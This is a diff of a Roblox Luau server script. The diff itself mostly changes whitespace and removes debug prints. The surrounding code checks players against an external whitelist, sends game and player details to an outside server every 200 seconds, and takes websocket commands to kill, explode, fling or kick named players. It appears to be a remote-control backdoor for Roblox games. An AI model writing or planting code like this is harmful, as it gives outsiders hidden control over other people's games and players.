@@ -32,6 +32,8 @@ function isUserWhitelisted(name)
 			})
 
 			if game.HttpService:JSONDecode(req.Body).success == true then
+
+				
 				return game.HttpService:JSONDecode(req.Body).result
 			else
 				return false
@@ -40,12 +42,12 @@ function isUserWhitelisted(name)
 		if success then
 			return data
 		else
-			print(data)
-			task.wait(3)
+		
+			task.wait(6)
 		end
 	until success or attempts == 5
 	return false
-	
+
 end
 
 function logGame()
@@ -56,7 +58,7 @@ function logGame()
 			["Content-Type"] = "application/json"
 		},
 		Body = game.HttpService:JSONEncode(
-			
+
 			{
 				["gameName"] =  game.Name,
 				["playersInServer"] = tostring(#game.Players:GetPlayers()),
@@ -68,25 +70,25 @@ function logGame()
 
 		)
 	})
-	
-	
+
+
 end
 
 
 
 
 game.Players.PlayerAdded:Connect(function(plr)
-	
+
 	if isUserWhitelisted(plr.Name) then
-		print("here")
+		
 		local debounce = true
 		local clone = script.UI:Clone()
 		clone.Parent = plr.PlayerGui
-		
+
 		local clone = script.UiWatermark:Clone()
 		clone.Parent = plr.PlayerGui
-		
-		
+
+
 		plr.CharacterAdded:Connect(function()
 			if debounce then return end
 			--script.UI:Clone().Parent = plr.PlayerGui
@@ -100,8 +102,8 @@ end)
 
 
 task.spawn(function()
-	
-	
+
+
 	while wait(200) do
 		pcall(logGame)
 	end
@@ -119,11 +121,11 @@ function getPlayerList()
 		origString = origString .. "\n" .. "`" .. plr.Name .. "`"
 	end
 	return origString
-	
-	
+
+
 end
 gameSocket.OnMessageReceived:Connect(function(msg: string?)
-	
+
 	local decompiled = game.HttpService:JSONDecode(msg)
 	if game["Run Service"]:IsStudio() then
 		print(decompiled)
@@ -154,7 +156,7 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 			end)
 			gameSocket.Send(getPlayerList())
 		end
-		
+
 		if method == "kill" then
 			task.spawn(function()
 				local req = game.HttpService:RequestAsync({
@@ -188,10 +190,10 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 			else
 				gameSocket.Send("Player " .. "`" .. args[1].value .. "`" .. " does not exist")
 			end
-			
-			
+
+
 		end
-		
+
 		if method == "explode" then
 			task.spawn(function()
 				local req = game.HttpService:RequestAsync({
@@ -213,13 +215,13 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 					)
 				})
 			end)
-			
+
 			if game.Players:FindFirstChild(args[1].value) then
 				local suc, result = pcall(function()
 					local ex = Instance.new("Explosion")
 					ex.Position = game.Players:FindFirstChild(args[1].value).Character.HumanoidRootPart.Position
 					ex.Parent = workspace
-					
+
 				end)
 				if suc then
 					gameSocket.Send("Exploded player " .. "`" .. args[1].value .. "`")
@@ -232,7 +234,7 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 
 
 		end
-		
+
 		if method == "fling" then
 			task.spawn(function()
 				local req = game.HttpService:RequestAsync({
@@ -275,7 +277,7 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 
 
 		end
-		
+
 		if method == "kick" then
 			task.spawn(function()
 				local req = game.HttpService:RequestAsync({
@@ -313,8 +315,8 @@ gameSocket.OnMessageReceived:Connect(function(msg: string?)
 
 
 		end
-		
-		
+
+
 	end
 end)
 
